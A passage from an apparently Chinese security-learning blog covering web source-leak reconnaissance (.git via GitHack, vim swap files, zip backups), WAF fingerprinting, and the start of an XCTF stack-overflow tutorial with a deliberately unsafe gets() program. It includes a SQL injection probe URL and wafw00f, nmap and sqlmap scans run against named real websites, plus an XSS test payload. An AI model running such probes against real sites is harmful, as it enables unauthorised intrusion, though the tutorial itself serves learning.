<figcaption aria-hidden="true">image-20220604205017452</figcaption>
</figure>
<p>这个玩意儿是用来记录代码变更记录的,方便代码写毁球的时候退回到早期的版本</p>
<p>这个目录默认是隐藏的,在windows上如果不设置查看隐藏文件是不会显示的</p>
<p>然后写CMS的一伙子人在发布其CMS源代码的时候忘记删除这个玩意儿了,建站的企业可能对这个玩意不甚了解,以为是网站支持文件,或者由于其隐藏根本不知道有这个东西.建立的网站根目录下就藏着这么一个<code>.git</code>目录</p>
<p>诚如是,我们就可以使用GitHack下载还原出源代码</p>
<p>具体怎么各操作呢?我们首先模拟一伙子写CMS的苦逼程序员,</p>
<h4 id="程序员视角">程序员视角</h4>
<p>我们首先初始化一个版本管理仓库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\phpstudy_pro\WWW\AtomCMS&gt; git init</span><br><span class="line">Reinitialized existing Git repository in D:/phpstudy_pro/WWW/AtomCMS/.git/</span><br></pre></td></tr></table></figure>
<p>我们经历千辛万苦,终于写好了一个后端(这里直接下载了一个AtomCMS)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS D:\phpstudy_pro\WWW\AtomCMS&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: D:\phpstudy_pro\WWW\AtomCMS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----         2022/4/14     21:38                .idea</span><br><span class="line">d-----         2022/4/14     18:00                admin</span><br><span class="line">d-----         2022/4/13     21:12                config</span><br><span class="line">d-----         2022/4/13     21:21                functions</span><br><span class="line">d-----         2022/4/13     20:26                images</span><br><span class="line">d-----         2022/4/13     20:26                template</span><br><span class="line">d-----         2022/4/14     17:49                uploads</span><br><span class="line">d-----         2022/4/13     20:26                views</span><br><span class="line">d-----         2022/4/13     20:26                widgets</span><br><span class="line">------        2015/10/22      3:16             22 .gitignore</span><br><span class="line">------        2015/10/22      3:16            162 .htaccess</span><br><span class="line">------        2015/10/22      3:16            301 .project</span><br><span class="line">------        2015/10/22      3:16             12 CNAME</span><br><span class="line">------        2015/10/22      3:16           5048 database-video81.sql</span><br><span class="line">------        2015/10/22      3:16           4963 database.sql</span><br><span class="line">------        2015/10/22      3:16            176 index.php</span><br><span class="line">------        2015/10/22      3:16           9872 README.md</span><br></pre></td></tr></table></figure>
<p>然后我们保存此次版本,</p>
<p>首先将代码放到暂存区</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\phpstudy_pro\WWW\AtomCMS&gt; git add .</span><br></pre></td></tr></table></figure>
<p>然后将暂存区提交到本地仓库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\phpstudy_pro\WWW\AtomCMS&gt; git commit</span><br><span class="line">Aborting commit due to empty commit message.</span><br></pre></td></tr></table></figure>
<p>然后我们将这些东西上传到了github供其他人下载使用,但是忘记删除.git目录了.</p>
<p>程序员的工作就完成了,下面我们站在用户视角</p>
<h4 id="用户视角">用户视角</h4>
<p>用户在github上,下载了该CMS的源代码,.git也随之进入网站根目录,现在我们站在用户的视角,我们用phpstudy模拟建站的过程</p>
<p>建立网站之后,我们可以通过ip地址(内网模拟)或者域名(没买)访问该网站</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604210301690.png"
alt="image-20220604210301690" />
<figcaption aria-hidden="true">image-20220604210301690</figcaption>
</figure>
<p>用户的工作就完成了</p>
<p>现在我们站在攻击者的视角.</p>
<h4 id="攻击者视角">攻击者视角</h4>
<p>攻击者尝试访问<code>/.git</code>目录</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604210528946.png"
alt="image-20220604210528946" />
<figcaption aria-hidden="true">image-20220604210528946</figcaption>
</figure>
<p>发现没有访问权限,这个文件夹是有可能存在的,不妨试一试</p>
<p>于是他拿出了GitHack</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/d/web安全/GitHack-master]</span><br><span class="line">└─$ python2 GitHack.py http://192.168.43.44/AtomCMS/.git</span><br><span class="line">[+] Download and parse index file ...</span><br><span class="line">.gitignore</span><br><span class="line">.htaccess</span><br><span class="line">.idea/.gitignore</span><br><span class="line">.idea/AtomCMS.iml</span><br><span class="line">.idea/modules.xml</span><br><span class="line">.project</span><br><span class="line">CNAME</span><br><span class="line">README.md</span><br><span class="line">admin/ajax/avatar.php</span><br><span class="line">admin/ajax/blur-save.php</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>真就下载到了网站源代码,保存到了<code>GitHack-master/192.168.43.44/</code>下面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS D:\web安全\GitHack-master\192.168.43.44&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: D:\web安全\GitHack-master\192.168.43.44</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----          2022/6/4     20:56                .idea</span><br><span class="line">d-----          2022/6/4     20:56                admin</span><br><span class="line">d-----          2022/6/4     20:56                config</span><br><span class="line">d-----          2022/6/4     20:56                <span class="built_in">functions</span></span><br><span class="line">d-----          2022/6/4     20:56                images</span><br><span class="line">d-----          2022/6/4     20:56                template</span><br><span class="line">d-----          2022/6/4     20:56                uploads</span><br><span class="line">d-----          2022/6/4     20:56                views</span><br><span class="line">d-----          2022/6/4     20:56                widgets</span><br><span class="line">-a----          2022/6/4     21:06             22 .gitignore</span><br><span class="line">-a----          2022/6/4     21:06            162 .htaccess</span><br><span class="line">-a----          2022/6/4     21:06            301 .project</span><br><span class="line">-a----          2022/6/4     21:06             12 CNAME</span><br><span class="line">-a----          2022/6/4     21:06           5048 database-video81.sql</span><br><span class="line">-a----          2022/6/4     21:06           4963 database.sql</span><br><span class="line">-a----          2022/6/4     21:06            176 index.php</span><br><span class="line">-a----          2022/6/4     21:06           9872 README.md</span><br></pre></td></tr></table></figure>
<p>至于GitHack的原理,由于我们有GitHack.py源代码,只要想研究应该可以明白的,但是对于一个python和git都是初学的球,现在不是时候</p>
<h3 id="svn源码泄漏">SVN源码泄漏</h3>
<p>现在都用git仓库了,不会还有人使用SVN吧?</p>
<p>(其实是没学过SVN不会复现该漏洞罢了)</p>
<h3 id="ds_store文件泄漏">.DS_Store文件泄漏</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604211429182.png"
alt="image-20220604211429182" />
<figcaption aria-hidden="true">image-20220604211429182</figcaption>
</figure>
<p>苹果电脑吗...不想研究</p>
<h3 id="网站备份文件泄漏">网站备份文件泄漏</h3>
<p>该漏洞需要两个条件</p>
<p>1.存在备份文件,比如.swp,.bak,.zip等类型</p>
<blockquote>
<p>这是有可能的,比如网站升级或者修改的时候,一个有着"好"习惯的管理员都应该备份一下再做修改.但是备份在网站目录下就不对了</p>
</blockquote>
<p>2.网站没有设置好访问权限,导致这些备份文件可以被访问下载</p>
<h4 id="swp文件">swp文件</h4>
<p>如果后端在linux上,那么有很大机率管理员会使用vim修改文件</p>
<p>当vim修改文件并正常退出(<code>Esc之后:wq</code>)则啥事没有</p>
<p>如果管理员很暴躁,<code>vim</code>打开文件之后直接<code>Ctrl+z</code>中断退出,则会在同一目录下留下<code>.swp</code>文件</p>
<blockquote>
<p>实际上是编辑时产生,正常退出时删除,</p>
<p>ctrl+c导致没有正常退出,没有删除</p>
<p>为啥编辑时要产生这么一个文件呢?</p>
<p>试想如果编辑了一阵子改毁球了,怎么撤销修改退回一开始的版本呢?这就是刚开始编辑时生成的swp文件的作用</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/d/phpstudy_pro/www/atomcms]</span><br><span class="line">└─$ <span class="built_in">ls</span> -a -l</span><br><span class="line">total 36</span><br><span class="line">drwxrwxrwx 1 kali kali 4096 Jun  4 21:18 .</span><br><span class="line">drwxrwxrwx 1 kali kali 4096 Apr 26 20:53 ..</span><br><span class="line">...</span><br><span class="line">-rwxrwxrwx 1 kali kali  176 Oct 22  2015 index.php</span><br><span class="line">-rwxrwxrwx 1 kali kali 4096 Jun  4 21:18 .index.php.swo</span><br><span class="line">-rwxrwxrwx 1 kali kali 4096 Jun  4 21:18 .index.php.swp</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里<code>.index.php.swp</code>就是备份文件,<code>.swo</code>是两次暴躁生成
的,下一次再暴躁就有<code>.swn</code>了</p>
<p>诚如是,则在URL中直接访问该<code>.index.php.swp</code>文件就可以看到文件源代码了(意思是该文件会被作为.txt解析)</p>
<p>然鹅我做实验时访问该文件会获得http505状态码</p>
<h4 id="zip文件">zip文件</h4>
<p>如果在网站目录下面有一个zip文件,那么在URL上访问它是可以直接下载的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604213228081.png"
alt="image-20220604213228081" />
<figcaption aria-hidden="true">image-20220604213228081</figcaption>
</figure>
<p>如果网站管理员又懒又屑,建站的时候直接把压缩包放在根目录下面解压建站,完事儿还忘记删除该压缩包,这就相当于直接把白盒给我们了</p>
<h3 id="漏洞修复">漏洞修复</h3>
<p>1.删除不该有的文件和目录</p>
<p>.git,.svn,.zip,.bak,.DS_Store等等</p>
<p>2.修改web服务器的配置文件,拒绝对.svn,.git路径的访问</p>
<h2 id="目标历史漏洞收集">目标历史漏洞收集</h2>
<p>收集目标站点的CMS,中间件,数据库,操作系统等组件的类型版本信息,然后去各大漏洞库查询该版本曝光的漏洞</p>
<p>比如阿里云漏洞库</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604223309338.png"
alt="image-20220604223309338" />
<figcaption aria-hidden="true">image-20220604223309338</figcaption>
</figure>
<p>就可以根据别人的漏洞复现进行攻击了</p>
<p>相当于有老师带着做的白盒测试</p>
<h3 id="阿里云漏洞库"><a
target="_blank" rel="noopener" href="https://avd.aliyun.com/">阿里云漏洞库</a></h3>
<p>查询wordpressCMS的所有漏洞</p>
<figure>
<img
src="../AppData/Roaming/Typora/typora-user-images/image-20220604232200215.png"
alt="image-20220604232200215" />
<figcaption aria-hidden="true">image-20220604232200215</figcaption>
</figure>
<h3 id="国家信息安全漏洞库cnnvd"><a
target="_blank" rel="noopener" href="http://www.cnnvd.org.cn/web/vulnerability/queryLds.tag">国家信息安全漏洞库CNNVD</a></h3>
<h2 id="waf识别">WAF识别</h2>
<p>WAF(web application firewell)web应用防火墙</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604235137919.png"
alt="image-20220604235137919" />
<figcaption aria-hidden="true">image-20220604235137919</figcaption>
</figure>
<p>WAF提供应用层的防护</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605091858083.png"
alt="image-20220605091858083" />
<figcaption aria-hidden="true">image-20220605091858083</figcaption>
</figure>
<h3 id="waf识别-1">WAF识别</h3>
<p>发送不正确的URL访问,触发WAF的防护,根据WAF的相应判断WAF的指纹</p>
<p>常用的WAF识别工具:</p>
<p>wafw00f,nmap,sqlmap</p>
<h4 id="手工方法">手工方法</h4>
<h5 id="cookie值识别">cookie值识别</h5>
<h5 id="http响应头识别">HTTP响应头识别</h5>
<h5 id="构造恶意负载">构造恶意负载</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.washun.com/search.php?q=-1%20union%20select%201</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605094155821.png"
alt="image-20220605094155821" />
<figcaption aria-hidden="true">image-20220605094155821</figcaption>
</figure>
<h4 id="自动化工具">自动化工具</h4>
<h4 id="wafw00f">wafw00f</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# wafw00f http://www.sdtxsn.com/</span><br><span class="line"></span><br><span class="line">                ______</span><br><span class="line">               /      \</span><br><span class="line">              (  W00f! )</span><br><span class="line">               \  ____/</span><br><span class="line">               ,,    __            404 Hack Not Found</span><br><span class="line">           |`-.__   / /                      __     __</span><br><span class="line">           /<span class="string">&quot;  _/  /_/                       \ \   / /</span></span><br><span class="line"><span class="string">          *===*    /                          \ \_/ /  405 Not Allowed</span></span><br><span class="line"><span class="string">         /     )__//                           \   /</span></span><br><span class="line"><span class="string">    /|  /     /---`                        403 Forbidden</span></span><br><span class="line"><span class="string">    \\/`   \ |                                 / _ \</span></span><br><span class="line"><span class="string">    `\    /_\\_              502 Bad Gateway  / / \ \  500 Internal Error</span></span><br><span class="line"><span class="string">      `_____``-`                             /_/   \_\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        ~ WAFW00F : v2.1.0 ~</span></span><br><span class="line"><span class="string">        The Web Application Firewall Fingerprinting Toolkit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking http://www.sdtxsn.com/</span></span><br><span class="line"><span class="string">[+] Generic Detection results:</span></span><br><span class="line"><span class="string">[-] No WAF detected by the generic detection</span></span><br><span class="line"><span class="string">[~] Number of requests: 7</span></span><br></pre></td></tr></table></figure>
<p>wafw00f没有检测出waf</p>
<h4 id="nmap-1">nmap</h4>
<p>测试waf是否存在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;目标域名&gt; --script=http-waf-detect.nse </span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap www.sdtxsn.com --script=http-waf-detect.nse -p 80</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 09:33 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> www.sdtxsn.com (121.36.56.23)</span><br><span class="line">Host is up (0.044s latency).</span><br><span class="line">rDNS record <span class="keyword">for</span> 121.36.56.23: ecs-121-36-56-23.compute.hwclouds-dns.com</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.29 seconds</span><br></pre></td></tr></table></figure>
<p>这里就没有检测到waf存在</p>
<p>拿学校官网试一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap ehall.xidian.edu.cn --script=http-waf-detect.nse -p 80</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 09:34 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ehall.xidian.edu.cn (61.150.43.100)</span><br><span class="line">Host is up (0.022s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">| http-waf-detect: IDS/IPS/WAF detected:</span><br><span class="line">|_ehall.xidian.edu.cn:80/?p4yl04d3=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.34 seconds</span><br></pre></td></tr></table></figure>
<p>发现是有防火墙存在的,检测方法是在主页上构造xss攻击负载,结果被拦截</p>
<p>判断waf指纹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;目标域名&gt; --script=http-waf-fingerprint</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap ehall.xidian.edu.cn --script=http-waf-fingerprint -p 80,443</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 09:37 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ehall.xidian.edu.cn (61.150.43.100)</span><br><span class="line">Host is up (0.027s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.28 seconds</span><br></pre></td></tr></table></figure>
<p>没有检测出来</p>
<h4 id="sqlmap">sqlmap</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# sqlmap -u http://ehall.xidian.edu.cn/ --batch</span><br><span class="line">...</span><br><span class="line">[09:43:12] [CRITICAL] WAF/IPS identified as <span class="string">&#x27;WTS&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="信息收集总结">信息收集总结</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605095016581.png"
alt="image-20220605095016581" />
<figcaption aria-hidden="true">image-20220605095016581</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605095048717.png"
alt="image-20220605095048717" />
<figcaption aria-hidden="true">image-20220605095048717</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605095108752.png"
alt="image-20220605095108752" />
<figcaption aria-hidden="true">image-20220605095108752</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605095126687.png"
alt="image-20220605095126687" />
<figcaption aria-hidden="true">image-20220605095126687</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605095133730.png"
alt="image-20220605095133730" />
<figcaption aria-hidden="true">image-20220605095133730</figcaption>
</figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/03/xctf-pwn-%E6%96%B0%E6%89%8B10%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/03/xctf-pwn-%E6%96%B0%E6%89%8B10%E9%A2%98/" class="post-title-link" itemprop="url">xctf攻防世界-pwn-新手村</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-03 16:16:00" itemprop="dateCreated datePublished" datetime="2022-06-03T16:16:00+08:00">2022-06-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-03 16:43:53" itemprop="dateModified" datetime="2022-10-03T16:43:53+08:00">2022-10-03</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="xctf攻防世界-pwn-新手村">xctf攻防世界-pwn-新手村</h1>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603161727708.png"
alt="image-20220603161727708" />
<figcaption aria-hidden="true">image-20220603161727708</figcaption>
</figure>
<h2 id="新手村准备">000新手村准备</h2>
<h3 id="栈缓冲区溢出原理">栈缓冲区溢出原理</h3>
<p>一些C语言函数在获取输入到缓冲区时不关心缓冲区大小和输入长度,只要有输入就一直往缓冲区写入数据,如果往一个只能容纳两个字符的缓冲区写入三个字符就会导致缓冲区溢出</p>
<p>比如这么一个程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span> a=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>gcc main.c -fno-stack-protector -O0 -o main -g</code>编译</p>
<blockquote>
<p><code>-fno-stack-protector</code>不使用栈保护者(比如金丝雀)</p>
<p><code>-O0</code>不使用编译优化</p>
<p><code>-g</code>生成gdb调试信息,即创建<code>.debug</code>节</p>
<p><code>-o main</code>编译链接生成的程序改名为<code>main</code></p>
</blockquote>
<p>此时会报一个编译警告</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">warning: the `gets&#x27; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>
<p>为什么说gets函数是危险的?因为他没有对输入的字符数和缓冲区大小进行检查,</p>
<p>使用<code>checksec</code>命令观察该程序使用的保护措施,发现<code>No canary found</code>即没有使用金丝雀</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511100355390.png"
alt="image-20220511100355390" />
<figcaption aria-hidden="true">image-20220511100355390</figcaption>
</figure>
<p>首先使用ida64打开程序观察一下func函数的栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000010</span><br><span class="line">-0000000000000010                 db ? ; undefined			;后面开出的这一些是为了栈16字节对齐</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C                 db ? ; undefined</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005                 db ? ; undefined</span><br><span class="line">-0000000000000004                 db ? ; undefined</span><br><span class="line">-0000000000000003 s               db 2 dup(?)</span><br><span class="line">-0000000000000001 a               db ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>返回地址在<code>rbp+0x8</code>,</p>
<p><code>char a</code>在<code>rbp-0x1</code></p>
<p><code>char s[2]</code> 数组在<code>rbp-0x3</code></p>
<p>栈是从高地址向低地址增长的,然后站内的局部变量是从低地址向高地址增长的,即如果输入s,第一个字符会放在<code>rbp-0x3</code>,第二个字符会放在<code>rbp-0x2</code>,此时缓冲区用完了,如果有第三个字符,则放在<code>0x01</code>而这里恰好是a变量的地址,因此如果输入2个以上字符则会破坏a变量</p>
<blockquote>
<p>注意这里char s[2]中的2关键,它就限制了s数组的大小是2字节.</p>
<p>char buffer[]="123456"和char buffer[10]="123456"两者的区别就是</p>
<p>前者buffer根据"123456"确定为6个字节,而后者buffer固定为10字节</p>
<p>缓冲区长度固定很重要,使我们可以计算缓冲区和返回地址的距离</p>
</blockquote>
<p>为了验证这个事情,我们用gdb调试器调试</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511091428527.png"
alt="image-20220511091428527" />
<figcaption aria-hidden="true">image-20220511091428527</figcaption>
</figure>
<p>在第七行和第八行分别下断点,运行之后程序停在第七行然后<code>continue</code>,接下来输入<code>bcd</code>作为<code>gets</code>的输入,按下<code>enter</code>之后程序停在第八行</p>
<p>此时<code>print a</code>发现a的值已经变成了<code>d</code></p>
<p>如果没有开启金丝雀保护,那么再使使劲输入点东西,可以溢出改变返回地址</p>
<h3 id="防御措施">防御措施</h3>
<h4 id="金丝雀canary">金丝雀canary</h4>
<p>同样的程序使用<code>gcc main.c -Og -o main -g</code>编译链接,相对于刚才的编译选项,这次没有<code>-fno-stack-protector</code>,默认使用栈保护者金丝雀</p>
<p>这次再使用<code>checksec</code>命令查看保护措施,发现<code>Canary found</code>即有金丝雀保护</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511100510166.png"
alt="image-20220511100510166" />
<figcaption aria-hidden="true">image-20220511100510166</figcaption>
</figure>
<p>用ida64查看反汇编,相对于没有金丝雀保护的程序,<code>func</code>函数这次多了一些东西</p>
<p><code>func</code></p>
